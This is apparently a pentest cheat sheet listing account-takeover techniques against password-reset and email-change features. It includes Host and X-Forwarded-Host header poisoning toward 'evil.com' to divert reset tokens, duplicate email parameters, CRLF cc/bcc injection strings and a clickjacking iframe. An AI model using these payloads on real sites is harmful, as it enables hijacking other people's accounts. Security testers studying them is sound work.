### Forget Password Functionality
```
- Register an account as an attacker
- Change password and intercept success response of password change
- Register an account as a victim
- Try to change password and intercept the response
- Paste the attacker success response
```
```
- Click forgot password and put your email
- Intercept the request and add some headers with attacker control domain.
- Check email and see if password token comes with attacker control domain.
```

#### Headers
Try to change Host header.
```
Host: evil.com

Not working? Jsut double it.
Host: target.com
Host: evil.com
```

Other Headers
```
X-Forwarded-For
X-Forwarded-Host
Referer
Origin
```

#### With HTTP Parameter Pollution
```
- Go to password reset link, enter new password and intercept the request
- Add extra email parameter on the request
  email=attacker@email&email=victim@email
- If response success then see which account password has been changed
```

```
- Click Forgot Password
- Enter victim@mail.com%0d%0accattacker@mail.com Or victim@mail.com%0d%0abccattacker@mail.com
```

### Email Change
#### ClickJacking
```
If email can change via GET parameter then check is there any protection against ClickJacking.
<iframe src="http://example.com/change?email=attacker@mail.com"></iframe>
```
